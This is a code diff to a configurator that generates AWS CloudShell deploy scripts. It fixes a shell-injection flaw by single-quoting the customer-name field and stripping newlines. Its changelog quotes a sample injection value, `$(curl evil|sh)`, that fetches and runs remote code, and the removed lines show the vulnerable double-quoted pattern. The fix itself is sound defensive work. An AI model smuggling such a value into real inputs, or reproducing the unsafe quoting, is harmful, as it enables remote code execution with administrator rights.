@@ -977,8 +977,8 @@
 
     <script>
         // Template version — single source of truth for the SemVer constant.
-        // Must match `TEMPLATE_VERSION = 'v20.5.1'` in map2-auto-tagger-optimized.yaml (sync-check enforces this).
-        const TEMPLATE_VERSION = 'v20.5.1';
+        // Must match `TEMPLATE_VERSION = 'v20.5.2'` in map2-auto-tagger-optimized.yaml (sync-check enforces this).
+        const TEMPLATE_VERSION = 'v20.5.2';
 
         // Version history surfaced in the Update flow. Bullets are intentionally English-only —
         // translating release notes across 7 languages for every PR is unsustainable. Labels
@@ -986,6 +986,14 @@
         // Tags: bugfix, coverage, breaking, security, perf, other.
         // sync-check.py enforces that the newest entry's version matches TEMPLATE_VERSION.
         const VERSION_HISTORY = [
+            {
+                version: 'v20.5.2',
+                date: '2026-04-25',
+                changes: [
+                    { tag: 'security', text: 'Generated deploy.sh now contains customer-name input inside single-quoted shell strings (previously double-quoted). Fixes a supply-chain RCE where a partner-supplied customer name like `Acme $(curl evil|sh) Corp` would execute on the customer\'s CloudShell with AdministratorAccess. Re-download deploy.sh from the configurator before next deploy.' },
+                    { tag: 'other',    text: 'New Layer 1 CI check (Shell Injection Guard) fails the build if the generator reintroduces the unsafe shape.' },
+                ],
+            },
             {
                 version: 'v20.5.1',
                 date: '2026-04-25',
@@ -6251,9 +6259,19 @@ Outputs:
             // Escape backticks and dollar signs in template content for safe embedding in heredoc
             const escapeHeredoc = (s) => s.replace(/`/g, '\`');
 
-            // Sanitize customer name for safe use in shell — keep display name as-is (supports Unicode),
-            // use MPE ID for filename (always ASCII-safe)
-            const customerDisplay = (config.customerName || 'Customer').replace(/'/g, "'\\''");
+            // Shell-safe containment for customerName. We emit the value inside SINGLE quotes
+            // so bash performs no interpolation. The classic `'\''` trick closes the single-quoted
+            // span, inserts an escaped literal quote, and reopens. Also strip CR/LF to prevent a
+            // newline from escaping single-line shell contexts (e.g. comment lines).
+            //
+            // DO NOT change this to double-quoted emit without also removing the single-quote escape:
+            // in double quotes, $(...), backticks, \, and $VAR all still expand, re-opening the
+            // supply-chain RCE the escape was meant to prevent.
+            const shellSingleQuote = (s) => `'${String(s).replace(/[\r\n]/g, ' ').replace(/'/g, "'\\''")}'`;
+            const customerDisplay = shellSingleQuote(config.customerName || 'Customer');
+            // Header comment form — strip CR/LF so a newline in the field can't escape the `#`
+            // comment line and land on a fresh executable line.
+            const customerComment = String(config.customerName || 'Customer').replace(/[\r\n]/g, ' ');
             const reportFile = `map-tagger-report-${mpe}-\$(date +%Y%m%d-%H%M%S).txt`;
 
             if (config.deployMode === 'single') {
@@ -6263,7 +6281,7 @@ Outputs:
 # SPDX-License-Identifier: MIT-0
 #
 # MAP 2.0 Auto-Tagger — Deployment Script
-# Customer: ${config.customerName || 'Customer'} | MPE: ${mpe}
+# Customer: ${customerComment} | MPE: ${mpe}
 # Run this file in AWS CloudShell: bash deploy.sh
 set -e
 
@@ -6271,7 +6289,7 @@ STACK_NAME="map-auto-tagger-${mpe}"
 REGIONS="${regions.join(' ')}"
 REGION="${region}"
 MPE="${mpe}"
-CUSTOMER="${customerDisplay}"
+CUSTOMER=${customerDisplay}
 REPORT_FILE="${reportFile}"
 DEPLOY_TIME=\$(date '+%Y-%m-%d %H:%M:%S')
 PREFLIGHT_LOG=""
@@ -6761,7 +6779,7 @@ echo ""
 # SPDX-License-Identifier: MIT-0
 #
 # MAP 2.0 Auto-Tagger — Deployment Script
-# Customer: ${config.customerName || 'Customer'} | MPE: ${mpe}
+# Customer: ${customerComment} | MPE: ${mpe}
 # Run this file in AWS CloudShell (management account): bash deploy.sh
 set -e
 
@@ -6770,7 +6788,7 @@ REGION="${region}"
 ACCOUNT=\$(aws sts get-caller-identity --query Account --output text)
 BUCKET="auto-map-tagger-\${ACCOUNT}"
 STACK_NAME="map-auto-tagger-${mpe}"
-CUSTOMER="${customerDisplay}"
+CUSTOMER=${customerDisplay}
 REPORT_FILE="${reportFile}"
 DEPLOY_TIME=\$(date '+%Y-%m-%d %H:%M:%S')
 PREFLIGHT_LOG=""
